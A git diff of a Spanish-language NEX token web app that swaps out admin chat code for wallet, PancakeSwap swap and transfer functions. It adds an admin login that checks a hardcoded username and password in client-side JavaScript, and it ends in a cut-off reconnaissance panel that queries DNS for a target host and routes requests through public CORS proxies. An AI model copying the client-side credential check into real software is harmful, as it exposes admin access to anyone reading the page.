-                              ${data.banned ? 'Reactivar' : '🔴 Expulsar'}
-                          </button>
-                      </div>
-                  `;
-                  listaDiv.appendChild(d);
-              }
-
-              if (data.ultimoMensajeAt) {
-                  usuariosChat.push(data);
-              }
-          });
-
-          usuariosChat.sort((a, b) => b.ultimoMensajeAt?.toMillis() - a.ultimoMensajeAt?.toMillis());
-
-          if(chatListContainer) {
-              chatListContainer.innerHTML = '';
-              if(usuariosChat.length === 0) {
-                  chatListContainer.innerHTML = '<p style="color:var(--text-muted); font-size:12px;">No hay mensajes de usuarios aún.</p>';
-              }
-              usuariosChat.forEach(data => {
-                  const div = document.createElement('div');
-                  div.style.cssText = "background: var(--bg-dark); padding: 10px; border-radius: 6px; border: 1px solid var(--border-color); cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background 0.2s;";
-                  div.onmouseover = () => div.style.background = 'rgba(56, 189, 248, 0.1)';
-                  div.onmouseout = () => div.style.background = 'var(--bg-dark)';
-                  div.onclick = () => window.abrirChatUsuarioAdmin(data.uid, data.nombre || data.email);
-                  
-                  const dot = data.unreadAdmin ? '<span style="color: #10b981; font-size: 16px;" title="Nuevo mensaje">🟢</span>' : '';
-                  div.innerHTML = `
-                      <div style="display: flex; flex-direction: column;">
-                          <strong style="color: var(--text-main); font-size: 13px;">${data.nombre || data.email}</strong>
-                          <span style="font-size: 11px; color: var(--text-muted);">${data.email || ''}</span>
-                      </div>
-                      <div>${dot}</div>
-                  `;
-                  chatListContainer.appendChild(div);
-              });
-          }
+    if (data.status === "1" && data.result && data.result.length > 0) {
+      lista.innerHTML = '';
+      data.result.forEach(tx => {
+        const esRecibido = tx.to.toLowerCase() === address.toLowerCase();
+        const cantidad = parseFloat(ethers.utils.formatUnits(tx.value, parseInt(tx.tokenDecimal || 18))).toFixed(2);
+        const fecha = new Date(parseInt(tx.timeStamp) * 1000).toLocaleString();
+        const signo = esRecibido ? '+' : '-';
+        const d = document.createElement('div');
+        d.className = 'historial-item';
+        d.innerHTML =
+          '<div><span class="historial-tipo ' + (esRecibido ? 'tipo-compra' : 'tipo-envio') + '">' + (esRecibido ? 'RECIBIDO' : 'ENVIADO') + '</span>' +
+          '<div style="font-size:11px;color:var(--text-muted);">' + fecha + '</div>' +
+          '<a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank" style="font-size:10px;color:var(--primary-cyan);text-decoration:none;">Ver en BscScan ↗️</a></div>' +
+          '<div style="font-weight:bold;color:' + (esRecibido ? 'var(--green-up)' : 'var(--red-down)') + ';">' + signo + cantidad + ' NEX</div>';
+        lista.appendChild(d);
       });
+    } else {
+      lista.innerHTML = '<p style="color:var(--text-muted);text-align:center;">No se encontraron transacciones recientes de NEX en esta billetera.</p>';
+    }
+  } catch (err) {
+    console.error("Error historial:", err);
+    lista.innerHTML = '<p style="color:var(--red-down);text-align:center;">Error al conectar con BSCScan. Inténtalo más tarde.</p>';
+  }
+};
 
-      window.expulsarUsuarioAdmin = async function(uid, banStatus) {
-          try {
-              await updateDoc(doc(db, "usuarios", uid), { banned: banStatus });
-              alert(banStatus ? "Usuario expulsado y bloqueado." : "Acceso reactivado.");
-          } catch(e) { alert("Error al cambiar estado del usuario: " + e.message); }
-      };
+window.recalcularBalanceUsuario = function() {
+  const profitElem = document.getElementById('userProfit');
+  if (!profitElem) return;
+  const cambio = window.CAMBIO_24H_PORCENTAJE;
+  if (!Number.isFinite(cambio)) {
+    profitElem.innerText = '—';
+    profitElem.style.color = 'var(--text-muted)';
+    return;
+  }
+  const signo = cambio >= 0 ? '+' : '';
+  profitElem.innerText = signo + cambio.toFixed(2) + '%';
+  profitElem.style.color = cambio >= 0 ? 'var(--green-up)' : 'var(--red-down)';
+};
 
-      function escucharChatUsuario(uid) {
-          if (chatListenerUsuario) chatListenerUsuario();
-          const q = query(collection(db, "chats", uid, "mensajes"), orderBy("timestamp", "asc"));
-          chatListenerUsuario = onSnapshot(q, (snap) => {
-              const box = document.getElementById('userChatBox');
-              if(!box) return;
-              box.innerHTML = '';
-              snap.forEach(m => {
-                  const data = m.data();
-                  const div = document.createElement('div');
-                  div.className = `chat-msg ${data.sender === 'admin' ? 'msg-admin' : 'msg-user'}`;
-                  div.innerText = data.texto;
-                  box.appendChild(div);
-              });
-              box.scrollTop = box.scrollHeight;
-          });
+window.asegurarRedBNB = async function() {
+  if (typeof window.ethereum === 'undefined') throw new Error('No se detectó una billetera Web3.');
+  let chainId = await window.ethereum.request({ method: 'eth_chainId' });
+  if (String(chainId).toLowerCase() === '0x38') return;
+  try {
+    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+  } catch (switchError) {
+    if (switchError.code !== 4902) throw switchError;
+    await window.ethereum.request({
+      method: 'wallet_addEthereumChain',
+      params: [{
+        chainId: '0x38',
+        chainName: 'BNB Smart Chain Mainnet',
+        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+        rpcUrls: BSC_RPC_NODES,
+        blockExplorerUrls: ['https://bscscan.com/']
+      }]
+    });
+  }
+  chainId = await window.ethereum.request({ method: 'eth_chainId' });
+  if (String(chainId).toLowerCase() !== '0x38') throw new Error('Cambia la red a BNB Smart Chain.');
+};
+
+window.actualizarSaldosSwap = async function() {
+  const balanceElem = document.getElementById('swapUserBalance');
+  if (!window.walletDireccionConectada || typeof window.ethereum === 'undefined') {
+    balanceElem.innerText = 'Saldo: conecta la billetera';
+    return;
+  }
+  const currency = document.getElementById('swapCurrency').value;
+  balanceElem.innerText = 'Cargando saldo...';
+  try {
+    await window.asegurarRedBNB();
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    if (currency === 'BNB') {
+      const balanceWei = await provider.getBalance(window.walletDireccionConectada);
+      balanceElem.innerText = 'Saldo: ' + formatearSaldoReal(balanceWei, 18, 'BNB').display;
+    } else {
+      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, provider);
+      const [balanceWei, decimals] = await Promise.all([
+        usdtContract.balanceOf(window.walletDireccionConectada),
+        usdtContract.decimals()
+      ]);
+      balanceElem.innerText = 'Saldo: ' + formatearSaldoReal(balanceWei, Number(decimals), 'USDT').display;
+    }
+  } catch (error) {
+    balanceElem.innerText = 'Saldo: no disponible';
+    console.error("Error al cargar saldo:", error);
+  }
+};
+
+window.calcularRecepcionNEX = function() {
+  const amountStr = document.getElementById('swapAmountIn').value.trim();
+  const outElem = document.getElementById('swapExpectedOut');
+  const cantidad = parseFloat(amountStr);
+  const quoteRequestId = ++swapQuoteRequestId;
+  if (swapQuoteTimer) clearTimeout(swapQuoteTimer);
+
+  if (!Number.isFinite(cantidad) || cantidad <= 0) {
+    outElem.innerText = 'Ingresa una cantidad válida para cotizar.';
+    return;
+  }
+
+  const currency = document.getElementById('swapCurrency').value;
+  outElem.innerText = 'Consultando cotización de PancakeSwap...';
+  swapQuoteTimer = setTimeout(async () => {
+    try {
+      const provider = window.obtenerProveedorBSC();
+      const router = new ethers.Contract(PANCAKE_ROUTER_ADDRESS, ROUTER_ABI, provider);
+      const path = currency === 'BNB' ? [WBNB_ADDRESS, TOKEN_CONTRACT_ADDRESS] : [USDT_BSC_ADDRESS, TOKEN_CONTRACT_ADDRESS];
+      const inputDecimals = currency === 'BNB' ? 18 : Number(await new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, provider).decimals());
+      const tokenDecimals = Number(await new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider).decimals());
+      const amountInWei = ethers.utils.parseUnits(amountStr, inputDecimals);
+      const cantidades = await router.getAmountsOut(amountInWei, path);
+      const cantidadSalida = cantidades[cantidades.length - 1];
+      if (!cantidadSalida || cantidadSalida.isZero()) throw new Error('Cotización inválida');
+      if (quoteRequestId !== swapQuoteRequestId) return;
+      outElem.innerText = 'Cotización PancakeSwap: ' + formatearSaldoReal(cantidadSalida, tokenDecimals, 'NEX').display;
+    } catch (error) {
+      if (quoteRequestId !== swapQuoteRequestId) return;
+      outElem.innerText = 'Cotización no disponible. Inténtalo más tarde.';
+      console.warn('No se pudo cotizar:', error);
+    }
+  }, 300);
+};
+
+window.ejecutarSwapWeb3 = async function() {
+  const currency = document.getElementById('swapCurrency').value;
+  const amountInStr = document.getElementById('swapAmountIn').value.trim();
+  const cantidad = parseFloat(amountInStr);
+
+  if (!amountInStr || !Number.isFinite(cantidad) || cantidad <= 0) return alert("Ingresa una cantidad válida.");
+  if (typeof window.ethereum === 'undefined') return alert("Abre esta página desde tu billetera (MetaMask o Trust Wallet).");
+
+  try {
+    await window.asegurarRedBNB();
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const walletUser = await signer.getAddress();
+    const balanceWei = await provider.getBalance(walletUser);
+    const gasReserveWei = ethers.utils.parseEther('0.0005');
+
+    if (currency === 'BNB') {
+      const amountInWei = ethers.utils.parseEther(amountInStr);
+      if (balanceWei.lt(amountInWei.add(gasReserveWei))) {
+        return alert("Saldo insuficiente. No tienes suficiente BNB para esta cantidad más la comisión de red.");
       }
+    } else if (currency === 'USDT') {
+      if (balanceWei.lt(gasReserveWei)) {
+        return alert("Necesitas algo de BNB (aprox. 0.0005) para pagar el gas, aunque pagues con USDT.");
+      }
+      const usdtTest = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, provider);
+      const [usdtBal, usdtDecimals] = await Promise.all([usdtTest.balanceOf(walletUser), usdtTest.decimals()]);
+      const amountInWei = ethers.utils.parseUnits(amountInStr, Number(usdtDecimals));
+      if (usdtBal.lt(amountInWei)) return alert("No tienes suficiente saldo de USDT.");
+    }
 
-      window.enviarMensajeSoporte = async function() {
-          const input = document.getElementById('userChatMessage');
-          const msg = input.value.trim();
-          if(!msg || !window.usuarioActual) return;
-          try {
-              await addDoc(collection(db, "chats", window.usuarioActual.uid, "mensajes"), {
-                  texto: msg,
-                  sender: 'user',
-                  timestamp: serverTimestamp()
-              });
-              await setDoc(doc(db, "usuarios", window.usuarioActual.uid), {
-                  ultimoMensajeAt: serverTimestamp(),
-                  unreadAdmin: true
-              }, { merge: true });
-              input.value = '';
-          } catch(e) { alert("Error al enviar mensaje: " + e.message); }
-      };
+    const routerContract = new ethers.Contract(PANCAKE_ROUTER_ADDRESS, ROUTER_ABI, signer);
+    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
 
-      window.abrirChatUsuarioAdmin = async function(uid, nombreUsuario) {
-          chatAdminUidActual = uid;
-          document.getElementById('adminChatListContainer').style.display = 'none';
-          document.getElementById('adminChatActiveContainer').style.display = 'block';
-          document.getElementById('adminChatActiveTitle').innerText = "Chat con " + nombreUsuario;
-          
-          try {
-              await setDoc(doc(db, "usuarios", uid), { unreadAdmin: false }, { merge: true });
-          } catch(e) {}
+    if (currency === 'BNB') {
+      const amountInWei = ethers.utils.parseEther(amountInStr);
+      const path = [WBNB_ADDRESS, TOKEN_CONTRACT_ADDRESS];
+      const quote = await routerContract.getAmountsOut(amountInWei, path);
+      const expectedOut = quote[quote.length - 1];
+      if (!expectedOut || expectedOut.isZero()) throw new Error('Cotización inválida');
+      const amountOutMin = expectedOut.mul(PUNTOS_BASIS - MAX_SLIPPAGE_BPS).div(PUNTOS_BASIS);
+      if (amountOutMin.isZero()) throw new Error('Cotización demasiado pequeña');
+      const nexDecimals = Number(await new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider).decimals());
+      alert('Confirma en tu billetera. Recibirás al menos ' + formatearSaldoReal(amountOutMin, nexDecimals, 'NEX').display + ' (slippage 1%).');
+      const tx = await routerContract.swapExactETHForTokens(amountOutMin, path, walletUser, deadline, { value: amountInWei });
+      alert("Procesando compra en BNB Smart Chain...");
+      await tx.wait();
+      alert("¡Compra completada exitosamente!");
+    } else if (currency === 'USDT') {
+      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
+      const usdtDecimals = Number(await usdtContract.decimals());
+      const amountInWei = ethers.utils.parseUnits(amountInStr, usdtDecimals);
+      const path = [USDT_BSC_ADDRESS, TOKEN_CONTRACT_ADDRESS];
+      const quote = await routerContract.getAmountsOut(amountInWei, path);
+      const expectedOut = quote[quote.length - 1];
+      if (!expectedOut || expectedOut.isZero()) throw new Error('Cotización inválida');
+      const amountOutMin = expectedOut.mul(PUNTOS_BASIS - MAX_SLIPPAGE_BPS).div(PUNTOS_BASIS);
+      if (amountOutMin.isZero()) throw new Error('Cotización demasiado pequeña');
+      const nexDecimals = Number(await new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider).decimals());
+      alert("Paso 1: confirma la aprobación de USDT en tu billetera...");
+      const txApprove = await usdtContract.approve(PANCAKE_ROUTER_ADDRESS, amountInWei);
+      await txApprove.wait();
+      alert('Paso 2: confirma el intercambio. Recibirás al menos ' + formatearSaldoReal(amountOutMin, nexDecimals, 'NEX').display + '.');
+      const txSwap = await routerContract.swapExactTokensForTokens(amountInWei, amountOutMin, path, walletUser, deadline);
+      alert("Procesando compra en BNB Smart Chain...");
+      await txSwap.wait();
+      alert("¡Compra completada exitosamente!");
+    }
 
-          if (chatListenerAdmin) chatListenerAdmin();
-          const q = query(collection(db, "chats", uid, "mensajes"), orderBy("timestamp", "asc"));
-          chatListenerAdmin = onSnapshot(q, (snap) => {
-              const box = document.getElementById('adminChatBox');
-              if(!box) return;
-              box.innerHTML = '';
-              snap.forEach(m => {
-                  const data = m.data();
-                  const div = document.createElement('div');
-                  div.className = `chat-msg ${data.sender === 'admin' ? 'msg-admin' : 'msg-user'}`;
-                  div.innerText = data.texto;
-                  box.appendChild(div);
-              });
-              box.scrollTop = box.scrollHeight;
-          });
-      };
+    window.cerrarModal('modalCanjear');
+    document.getElementById('swapAmountIn').value = '';
+    await window.refrescarSaldoWallet(walletUser, true);
+  } catch (error) {
+    console.error("Error en canje:", error);
+    alert("No se pudo completar el canje: " + (error.reason || error.message || "Transacción cancelada."));
+  }
+};
 
-      window.volverListaChatAdmin = function() {
-          chatAdminUidActual = null;
-          if (chatListenerAdmin) {
-              chatListenerAdmin();
-              chatListenerAdmin = null;
-          }
-          document.getElementById('adminChatActiveContainer').style.display = 'none';
-          document.getElementById('adminChatListContainer').style.display = 'block';
-      };
+window.ejecutarEnvioTokensWeb3 = async function() {
+  const destino = document.getElementById('sendDestinationAddress').value.trim();
+  const cantidadStr = document.getElementById('sendTokenAmount').value.trim();
+  const cantidad = parseFloat(cantidadStr);
 
-      window.enviarRespuestaAdmin = async function() {
-          const uid = chatAdminUidActual;
-          const input = document.getElementById('adminReplyMessage');
-          const msg = input.value.trim();
-          if(!uid || !msg) return alert("Asegúrate de haber seleccionado un usuario y escrito un mensaje.");
-          try {
-              await addDoc(collection(db, "chats", uid, "mensajes"), {
-                  texto: msg,
-                  sender: 'admin',
-                  timestamp: serverTimestamp()
-              });
-              await setDoc(doc(db, "usuarios", uid), {
-                  unreadAdmin: false
-              }, { merge: true });
-              input.value = '';
-          } catch(e) { alert("Error al enviar respuesta: " + e.message); }
-      };
+  if (!destino || !ethers.utils.isAddress(destino)) return alert("Ingresa una dirección de destino válida (0x...).");
+  if (!cantidadStr || isNaN(cantidad) || cantidad <= 0) return alert("Ingresa una cantidad válida.");
+  if (typeof window.ethereum === 'undefined') return alert("Abre esta página desde tu billetera.");
 
-      window.guardarAjustesAdmin = async function() {
-          try {
-              const col = document.getElementById('adminColorMain').value;
-              const mode = document.getElementById('adminTradingMode').value;
-              await setDoc(doc(db, "configuracion", "general"), {
-                  colorBotones: col,
-                  tradingHabilitado: mode
-              }, { merge: true });
-              alert("Configuración guardada exitosamente.");
-          } catch(e) { alert("Error al guardar: " + e.message); }
-      };
+  try {
+    await window.asegurarRedBNB();
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const walletUser = await signer.getAddress();
+    const contract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, signer);
+    const tokenDecimals = Number(await contract.decimals());
+    const parsedAmount = ethers.utils.parseUnits(cantidadStr, tokenDecimals);
 
-      window.obtenerProveedorBSC = function() {
-        if (typeof window.ethereum !== 'undefined') {
-            try {
-                return new ethers.providers.Web3Provider(window.ethereum);
-            } catch(e) {}
-        }
-        for (let url of BSC_RPC_NODES) {
-          try {
-            return new ethers.providers.JsonRpcProvider(url);
-          } catch(e) {}
-        }
-        return new ethers.providers.JsonRpcProvider(BSC_RPC_NODES[0]);
-      };
+    alert("Confirma el envío en tu billetera...");
+    const tx = await contract.transfer(destino, parsedAmount);
+    alert("Procesando envío en BNB Smart Chain...");
+    await tx.wait();
+    alert("¡Envío completado con éxito!");
+    window.cerrarModal('sendTokensModal');
+    document.getElementById('sendDestinationAddress').value = '';
+    document.getElementById('sendTokenAmount').value = '';
+    await window.refrescarSaldoWallet(walletUser, true);
+  } catch (error) {
+    console.error("Error en envío:", error);
+    alert("No se pudo completar el envío: " + (error.reason || error.message || "Error RPC o firma cancelada."));
+  }
+};
 
-      window.formatearMoneda = function(valor, maxDec = 8) {
-        if (isNaN(valor) || valor === 0) return "0.00";
-        if (valor < 0.000001) return valor.toFixed(maxDec);
-        if (valor < 0.01) return valor.toFixed(6);
-        if (valor < 1) return valor.toFixed(4);
-        return valor.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
-      };
+window.consultarSaldoOnChain = async function(address, loadHistory = true) {
+  if (!address) return;
+  let walletAddress = null;
+  try {
+    walletAddress = ethers.utils.getAddress(address);
+    window.walletDireccionConectada = walletAddress;
+    const provider = window.obtenerProveedorBSC();
+    const contract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider);
+    const [rawBalance, tokenDecimals] = await Promise.all([contract.balanceOf(walletAddress), contract.decimals()]);
+    if (window.walletDireccionConectada !== walletAddress) return;
+    window.tokensActualesUsuario = Number(ethers.utils.formatUnits(rawBalance, Number(tokenDecimals)));
+    const el = document.getElementById('userTokens');
+    if (el) {
+      const tb = formatearSaldoReal(rawBalance, Number(tokenDecimals), 'NEX');
+      el.innerText = tb.display;
+      el.title = tb.exact + ' NEX';
+    }
+    const warning = document.getElementById('walletWarningBanner');
+    if (warning) warning.style.display = 'none';
+    document.getElementById('userDisplay').innerText = walletAddress.substring(0, 6) + "..." + walletAddress.substring(38);
+    window.recalcularBalanceUsuario();
+    if (loadHistory) window.cargarHistorialOnChainReal(walletAddress);
+  } catch (error) {
+    if (walletAddress && window.walletDireccionConectada === walletAddress) {
+      const el = document.getElementById('userTokens');
+      if (el) el.innerText = 'No disponible';
+    }
+    console.error("Error al consultar saldo:", error);
+  }
+};
 
-      window.actualizarPrecioTokenEnVivo = async function() {
+window.refrescarSaldoWallet = async function(address = window.walletDireccionConectada, loadHistory = false) {
+  if (!address) {
+    window.walletDireccionConectada = null;
+    mostrarWalletSinConectar();
+    const warning = document.getElementById('walletWarningBanner');
+    if (warning) warning.style.display = 'flex';
+    return;
+  }
+  let walletAddress;
+  try { walletAddress = ethers.utils.getAddress(address); }
+  catch (error) { window.walletDireccionConectada = null; mostrarWalletSinConectar(); return; }
+  window.walletDireccionConectada = walletAddress;
+  await Promise.all([
+    window.consultarSaldoOnChain(walletAddress, loadHistory),
+    window.actualizarSaldosReales(walletAddress)
+  ]);
+};
+
+if (typeof window.ethereum !== 'undefined' && typeof window.ethereum.on === 'function') {
+  window.ethereum.on('accountsChanged', async (accounts) => {
+    if (!accounts || accounts.length === 0) {
+      await window.refrescarSaldoWallet(null);
+      const ud = document.getElementById('userDisplay');
+      if (ud) ud.innerText = window.usuarioActual?.email || window.usuarioActual?.displayName || 'Invitado';
+      return;
+    }
+    await window.refrescarSaldoWallet(accounts[0]);
+  });
+  window.ethereum.on('chainChanged', async () => {
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts && accounts.length > 0) await window.refrescarSaldoWallet(accounts[0]);
+    } catch (error) { console.error('Error tras cambiar de red:', error); }
+  });
+}
+
+async function refrescarBilleteraSiConectada() {
+  if (typeof window.ethereum !== 'undefined' && typeof window.ethereum.request === 'function') {
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts && accounts.length > 0) { await window.refrescarSaldoWallet(accounts[0]); return; }
+      if (window.walletDireccionConectada) { await window.refrescarSaldoWallet(null); return; }
+    } catch (error) { console.warn('No se pudo revisar la cuenta:', error); }
+  }
+  if (window.walletDireccionConectada) await window.refrescarSaldoWallet();
+}
+
+document.addEventListener('visibilitychange', () => { if (!document.hidden) refrescarBilleteraSiConectada(); });
+
+onAuthStateChanged(auth, async (user) => {
+  if (user) {
+    window.usuarioActual = user;
+    onSnapshot(doc(db, "usuarios", user.uid), (uSnap) => {
+      const b = document.getElementById('bannedScreen');
+      if (uSnap.exists() && (uSnap.data().banned === true || uSnap.data().prohibido === true)) {
+        b.style.display = 'flex';
+      } else {
+        b.style.display = 'none';
+      }
+    });
+    localStorage.setItem("nex_sesion_activa", "true");
+    document.getElementById('welcomeSection').style.display = 'none';
+    document.getElementById('appContent').style.display = 'block';
+    document.getElementById('helpBtn').style.display = 'inline-block';
+    document.getElementById('btnLogoutTop').style.display = 'inline-block';
+    document.getElementById('authBtn').style.display = 'none';
+    document.getElementById('userDisplay').innerText = user.email || user.displayName || "Usuario NEX";
+    escucharChatUsuario(user.uid);
+    if (typeof window.ethereum !== 'undefined') {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length > 0) await window.refrescarSaldoWallet(accounts[0], true);
+      } catch(e){}
+    }
+  } else {
+    if (typeof window.ethereum !== 'undefined' || localStorage.getItem("nex_sesion_activa") === "true" || window.location.search.includes("autologin=true")) {
+      document.getElementById('welcomeSection').style.display = 'none';
+      document.getElementById('appContent').style.display = 'block';
+      document.getElementById('btnLogoutTop').style.display = 'inline-block';
+      document.getElementById('authBtn').style.display = 'none';
+      if (typeof window.ethereum !== 'undefined') {
         try {
-          const resBnb = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
-          const dataBnb = await resBnb.json();
-          if (dataBnb && dataBnb.price) {
-            window.PRECIO_BNB_USD = parseFloat(dataBnb.price);
-          }
-        } catch(e) {}
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          if (accounts && accounts.length > 0) await window.refrescarSaldoWallet(accounts[0], true);
+        } catch(e){}
+      }
+      return;
+    }
+    window.usuarioActual = null;
+    document.getElementById('appContent').style.display = 'none';
+    document.getElementById('welcomeSection').style.display = 'block';
+    document.getElementById('helpBtn').style.display = 'none';
+    document.getElementById('btnLogoutTop').style.display = 'none';
+    document.getElementById('authBtn').style.display = 'inline-block';
+  }
+});
 
+window.onload = async () => {
+  window.actualizarPrecioTokenEnVivo();
+  window.actualizarCambioPrecio24h();
+  setInterval(window.actualizarPrecioTokenEnVivo, 12000);
+  setInterval(window.actualizarCambioPrecio24h, 5 * 60 * 1000);
+  if (walletBalanceRefreshTimer) clearInterval(walletBalanceRefreshTimer);
+  walletBalanceRefreshTimer = setInterval(refrescarBilleteraSiConectada, 30000);
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts.length > 0) await window.refrescarSaldoWallet(accounts[0], true);
+    } catch(e){}
+  }
+};
+
+onSnapshot(doc(db, "configuracion", "general"), (snap) => {
+  if (!snap.exists()) return;
+  const d = snap.data();
+  if (d.colorBotones) document.documentElement.style.setProperty('--primary-cyan', d.colorBotones);
+  const trade = document.getElementById('realTradeSection');
+  if (trade) trade.style.display = d.tradingHabilitado !== "no" ? 'block' : 'none';
+  document.getElementById('adminColorMain').value = d.colorBotones || '#38bdf8';
+  document.getElementById('adminTradingMode').value = d.tradingHabilitado || 'yes';
+  document.getElementById('adminImageUrl').value = d.bannerUrl || '';
+  document.getElementById('adminBannerText').value = d.bannerTexto || '';
+  document.getElementById('adminBannerColor').value = d.bannerColor || '#ffffff';
+  document.getElementById('adminBannerMove').value = d.bannerMover || 'no';
+  document.getElementById('adminImagePosition').value = d.bannerPos || 'none';
+
+  const cont = document.getElementById('bannerTopContainer');
+  const img = document.getElementById('bannerTopImg');
+  const txt = document.getElementById('bannerTopText');
+  if (cont && img && txt) {
+    if (d.bannerUrl && d.bannerPos !== 'none') {
+      img.src = d.bannerUrl;
+      txt.textContent = d.bannerTexto || '';
+      txt.style.color = d.bannerColor || '#ffffff';
+      txt.classList.toggle('moving-text', d.bannerMover === 'yes');
+      cont.style.display = 'block';
+    } else {
+      cont.style.display = 'none';
+    }
+  }
+});
+
+window.toggleHistorial = function() {
+  const div = document.getElementById('historialLista');
+  div.style.display = div.style.display === 'none' ? 'block' : 'none';
+};
+</script>
+
+<script>
+window.abrirAuthModal = function() { document.getElementById('authModal').classList.add('show'); };
+window.cerrarAuthModal = function() { document.getElementById('authModal').classList.remove('show'); };
+window.abrirHelpModal = function() { document.getElementById('helpModal').classList.add('show'); };
+window.cerrarHelpModal = function() { document.getElementById('helpModal').classList.remove('show'); };
+window.abrirLoginAdminModal = function() { document.getElementById('adminAuthModal').classList.add('show'); };
+window.cerrarAdminModal = function() { document.getElementById('adminModal').classList.remove('show'); };
+window.cerrarModal = function(id) { document.getElementById(id).classList.remove('show'); };
+
+window.abrirModalCanjear = function() {
+  if (typeof window.ethereum === 'undefined' || !window.walletDireccionConectada) {
+    return alert("Por favor, conecta tu billetera primero para poder canjear.");
+  }
+  document.getElementById('swapAmountIn').value = '';
+  document.getElementById('swapExpectedOut').innerText = 'Ingresa una cantidad para cotizar.';
+  document.getElementById('modalCanjear').classList.add('show');
+  window.actualizarSaldosSwap();
+};
+
+window.validarCredencialesAdmin = function() {
+  const u = document.getElementById('adminUserInput').value;
+  const p = document.getElementById('adminPassInput').value;
+  if(u === "admin" && p === "200832") {
+    cerrarModal('adminAuthModal');
+    document.getElementById('adminModal').classList.add('show');
+    document.getElementById('adminUserInput').value = '';
+    document.getElementById('adminPassInput').value = '';
+  } else {
+    alert("Credenciales incorrectas");
+  }
+};
+
+window.cambiarPestanaAdmin = function(tabId, btn) {
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(tabId).classList.add('active');
+  btn.classList.add('active');
+};
+
+window.abrirWalletChoiceModal = function() { document.getElementById('walletChoiceModal').classList.add('show'); };
+window.abrirModalEnviarTokens = function() { document.getElementById('sendTokensModal').classList.add('show'); };
+
+window.vincularTokenWeb3 = async function(walletType) {
+  cerrarModal('walletChoiceModal');
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      if (accounts && accounts.length > 0) {
+        await window.asegurarRedBNB();
+        await window.refrescarSaldoWallet(accounts[0], true);
+        return;
+      }
+    } catch (error) { alert("Debes autorizar la conexión con tu billetera."); }
+  } else {
+    localStorage.setItem("nex_sesion_activa", "true");
+    const baseUrl = window.location.origin + window.location.pathname;
+    const targetUrl = baseUrl + '?autologin=true';
+    if (walletType === 'metamask') {
+      window.location.href = 'https://metamask.app.link/dapp/' + targetUrl.replace(/^https?:\/\//, '');
+    } else if (walletType === 'trustwallet') {
+      window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(targetUrl);
+    }
+  }
+};
+
+/* ================= MODO KLV AVANZADO ================= */
+(function(){
+  const $ = s => document.querySelector(s);
+  const $$ = s => Array.prototype.slice.call(document.querySelectorAll(s));
+  const put = (id, t) => { const e = $(id); if (e) e.textContent = t; };
+  const esc = s => String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+  const host = () => ($('#k-target').value || '').trim().replace(/^https?:\/\//,'').replace(/\/.*$/,'');
+
+  window.klvAbrir = () => { $('#klvPanel').classList.add('on'); document.body.style.overflow = 'hidden'; };
+  window.klvCerrar = () => { $('#klvPanel').classList.remove('on'); document.body.style.overflow = ''; };
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') window.klvCerrar(); });
+
+  $$('#klvPanel .klv-tab').forEach(b => b.onclick = () => {
+    $$('#klvPanel .klv-tab').forEach(x => x.classList.remove('on'));
+    $$('#klvPanel .klv-pane').forEach(x => x.classList.remove('on'));
+    b.classList.add('on'); $('#k-' + b.dataset.k).classList.add('on');
+  });
+
+  async function kf(url, ms){
+    ms = ms || 9000;
+    const c = new AbortController();
+    const t = setTimeout(() => c.abort(), ms);
+    try { return await fetch(url, { signal: c.signal }); }
+    catch (e) {
+      const P = [
+        u => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(u),
+        u => 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(u)
+      ];
+      for (const p of P) { try { const r = await fetch(p(url), { signal: c.signal }); if (r.ok) return r; } catch(_){} }
+      throw e;
+    } finally { clearTimeout(t); }
+  }
+
+  window.klvRecon = () => { klvDns(); klvIp(); };
+  async function doh(n, t){
+    const r = await fetch('https://dns.google/resolve?name=' + encodeURIComponent(n) + '&type=' + t);
+    return r.json();
+  }
+  window.klvDns = async () => {
+    const h = host(); if (!h) return put('#k-dns','Escribe un dominio.');
+    put('#k-dns','Consultando…');
+    try {
+      const j = await doh(h, $('#k-rtype').value);
+      const a = (j.Answer || []).map(x => x.type + '  ' + x.TTL + '  ' + x.data).join('\n');
+      put('#k-dns', a || 'Sin registros.');
+    } catch (e) { put('#k-dns','Error: ' + e.message); }
+  };
